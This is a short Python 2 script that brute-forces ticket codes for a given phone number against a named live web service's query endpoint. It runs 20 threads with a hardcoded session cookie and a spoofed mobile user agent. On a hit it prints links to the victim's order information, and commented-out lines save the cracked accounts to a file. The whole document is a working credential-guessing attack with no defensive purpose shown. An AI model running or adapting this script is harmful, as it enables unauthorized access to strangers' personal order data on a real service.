#!/usr/bin/env python
# coding=utf8
# author=joeyxy83@gmail.com
# create=20150729


import json
import random
import requests
import threadpool as tp
import sys

global phone


def _check(args):
    data = {'mobileticket':phone,
    'pwdticket':args,
    }
    headers = { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest',
                'Referer':'http://m.cdms.sjcxhz.com/Region/Check',
               'User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H143 MicroMessenger/6.2.3 NetType/WIFI Language/zh_CN',
        }
    cookies = {'Cookie':'ASP.NET_SessionId=3yjtgq50ces4frjovr4'}
    api_url = 'http://m.cdms.sjcxhz.com/Region/QueryTLink'
    try:
        req = requests.post(api_url, headers=headers, data = data, cookies = cookies, timeout=3)
        result = str(json.loads(req.content)['flag'])
        #print "phone:%s,result:%s" % (phone,result.lower())
    except:
        print "request error"
        pass

    if  result.lower() == 'true':
        print "phone:%sxxx ,done at code:%s" % (phone[:8],args)
        data = json.loads(req.content)['data']
        print "order info:%s" % 'http://m.cdms.sjcxhz.com/1/'+data
        #burp_success = open('./dd_account.txt', 'a+')
        #burp_success.write('%s:%s:password:%s\n'%(phone, code,password))
        #burp_success.close()
        #sys.exit(1)
    #else:
        
        #print "phone:%s,result:%s,code:%s" % (phone,result,args)
        #msg = json.loads(req.content)['msg']
        #print "phone:%s,error msg:%s,result:%s,code:%s" % (phone,msg,result,args)
        
        



if __name__ == '__main__':
    args = []
    phone = sys.argv[1]
    for i in range(940300,940700):
        #print "key:%s" % i
        args.append(i)
    pool = tp.ThreadPool(20)
    reqs = tp.makeRequests(_check, args)
    [pool.putRequest(req) for req in reqs]
    pool.wait()